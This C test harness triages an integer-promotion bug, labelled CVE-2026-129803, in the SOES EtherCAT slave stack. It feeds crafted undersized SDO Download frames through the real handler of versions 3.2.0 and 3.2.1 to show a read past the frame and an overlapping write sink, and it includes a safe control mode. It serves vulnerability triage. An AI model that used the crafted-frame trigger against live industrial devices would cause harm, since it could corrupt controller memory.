/* SOES 3.2.0 vs 3.2.1 — CVE-2026-129803 source-bound triage.
 *
 * Drives the REAL ESC_coeprocess() -> SDO_download() path with a non-expedited
 * SDO Download whose mailbox length field is BELOW COE_HEADERSIZE (10) but
 * still >= COE_MINIMUM_LENGTH (8). Dispatch accepts the frame at
 * esc_coe.c:1450; 3.2.0's clamp at :849-850 compares uint32 size against
 * the NEGATIVE int (length - COE_HEADERSIZE), promoted to a huge unsigned,
 * so the clamp never fires. Two consequences are measured:
 *
 *   "short-read": declared size 64 for a 64-byte object reads 64 bytes from
 *       MBX+14 although the frame declares only 8: 56 bytes come from past
 *       the declared frame. This isolates 129803 from CVE-129796 — the
 *       declared size matches the object, so the 129796 oversized-object
 *       write cannot fire. Destination is in bounds; the past-frame bytes
 *       are within the MBX[] global, so ASan is clean by design.
 *   "short-write": declared size 64 for an 8-byte object reaches the same
 *       copy2mbx() sink as CVE-129796 (:864 -> memcpy at :248); the
 *       undersized length is an independent trigger for that write, and
 *       3.2.1's new :854 length guard rejects it before the copy.
 *
 * Fixed 3.2.1 rejects length < COE_HEADERSIZE at esc_coe.c:854-858 in both
 * modes; a normal-length frame with a size-matched object is the safe control.
 * Frames are seeded in-process: no wire, no HAL, no live slave, no leaked
 * address, no command side effect. Rung 3 on the real pinned handler,
 * rung 4 harness-level at most — NOT wire evidence and NOT rung 5.
 */
#if defined(__has_feature)
#  if __has_feature(address_sanitizer)
#    define SOES_ASAN 1
#  endif
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
static uint8_t g_oct_alone[8];   /* standalone global: ASan sees its bounds */
static uint8_t g_writecanary[96]; /* plain-build neighbour after the object */

/* Real MBX/MBXcontrol/ESCvar and the real object handlers from ecat_slv.c. */
#include "ecat_slv.c"

/* Plain-build canary after the in-bounds read destination. */
static struct {
   uint8_t data[64];
   uint8_t canary[64];
} g_readobj;
static uint8_t g_ms0, g_ms1, g_ms2;

static const char n_ms[] = "maxsub", n_oct[] = "octet-string",
                  n_obj[] = "flexible-object";
static const _objd od_2002[] = {
   { 0, DTYPE_UNSIGNED8,    8, ATYPE_RO,    n_ms,  0, &g_ms0        },
   { 1, DTYPE_OCTET_STRING, 64, ATYPE_RWpre, n_oct, 0, g_oct_alone  },
};
static const _objd od_2003[] = {
   { 0, DTYPE_UNSIGNED8,     8, ATYPE_RO,    n_ms,  0, &g_ms2      },
   { 1, DTYPE_OCTET_STRING, 512, ATYPE_RWpre, n_oct, 0, g_readobj.data },
};
const _objectlist SDOobjects[] = {
   { 0x2002, OTYPE_RECORD, 1, 0, n_obj, od_2002 },
   { 0x2003, OTYPE_RECORD, 1, 0, n_obj, od_2003 },
   { 0xFFFF, 0, 0, 0, NULL, NULL },
};

/* Stubs for ecat_slv.c externs unused on this path. */
void ESC_write(uint16_t a, void *b, uint16_t l) { (void)a;(void)b;(void)l; }
void FOE_init(void) {}
void EOE_init(void) {}
void MBX_error(uint16_t err) { (void)err; }
uint8_t ESC_claimbuffer(void) { return 0; } /* suppress responses */
void ESC_read(uint16_t address, void *buf, uint16_t len)
{ (void)address; if (len) memset(buf, 0, len); }

/* Build a frame whose declared mailbox length is deliberately shorter than
 * the bytes physically present after the SDO header. Marker 0xe7 occupies
 * every payload byte so bytes sourced past the declared frame are visible. */
static void build_shortframe(uint16_t index, uint32_t declared, uint16_t length)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   memset((uint8_t *)(&s->size) + 4, 0xe7, 64);
   s->mbxheader.length = htoes(length);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = COE_COMMAND_DOWNLOADREQUEST;
   s->index = htoes(index);
   s->subindex = 1;
   s->size = htoel(declared);
}

static void deliver(const char *label)
{
   printf("%s: frame_len=%u\n", label,
          (unsigned)etohs(((_COEsdo *)&MBX[0])->mbxheader.length));
   MBXcontrol[0].state = MBXstate_inclaim;
   ESCvar.xoe = 0;
   ESC_coeprocess();
   printf("  -> xoe=%02x read0=%02x read8=%02x read63=%02x "
          "canary_nonzero=%u oct0=%02x\n",
          ESCvar.xoe, g_readobj.data[0], g_readobj.data[8],
          g_readobj.data[63],
          (unsigned)((g_readobj.canary[0] != 0) || (g_readobj.canary[63] != 0)),
          g_oct_alone[0]);
}

static unsigned writecanary_count(void)
{
   unsigned n = 0;
   for (unsigned i = 0; i < sizeof(g_writecanary); i++)
      n += (g_writecanary[i] != 0);
   return n;
}

int main(int argc, char **argv)
{
   const char *mode = argc > 1 ? argv[1] : "short-read";
   memset(&g_readobj, 0, sizeof(g_readobj));
   memset(g_oct_alone, 0, sizeof(g_oct_alone));
   memset(g_writecanary, 0, sizeof(g_writecanary));
   g_ms0 = g_ms1 = g_ms2 = 0;
   ESCvar.MBXrun = 1;
   ESCvar.ALstatus = ESCpreop;
   memset(MBXcontrol, 0, sizeof(MBXcontrol));
   ESCvar.xoe = 0;
#ifdef SOES_FIXED_VERSION
   printf("build: 3.2.1 (hash-pinned fixed source)\n");
#else
   printf("build: 3.2.0 (hash-pinned vulnerable source)\n");
#endif
   printf("mode: %s\n", mode);

   if (strcmp(mode, "short-read") == 0) {
      /* 64-byte object, declared 64, frame declares 8: past-frame read only. */
      build_shortframe(0x2003, 64, 8);
      deliver("undersized length 8, declared 64, 64-byte object");
   } else if (strcmp(mode, "short-write") == 0) {
      /* Same sink as CVE-129796, now triggered by an undersized frame. */
      build_shortframe(0x2002, 64, 8);
      deliver("undersized length 8, declared 64, 8-byte object");
   } else if (strcmp(mode, "short-safe") == 0) {
      /* Normal length, size-matched object: clean on both releases. */
      build_shortframe(0x2003, 8, COE_HEADERSIZE + 4 + 8);
      deliver("control: normal frame length 22, declared 8");
   } else {
      printf("unknown mode\n");
      return 2;
   }

   printf("verdict: read_payload_e7=%u read_body_e7=%u canary_clean=%u "
          "write_canary_bytes=%u write_canary0=%02x write_canary55=%02x\n",
          (unsigned)(g_readobj.data[0] == 0xe7),
          (unsigned)((g_readobj.data[8] == 0xe7) && (g_readobj.data[63] == 0xe7)),
          (unsigned)((g_readobj.canary[0] == 0) && (g_readobj.canary[63] == 0)),
          writecanary_count(), g_writecanary[0], g_writecanary[55]);
   return 0;
}
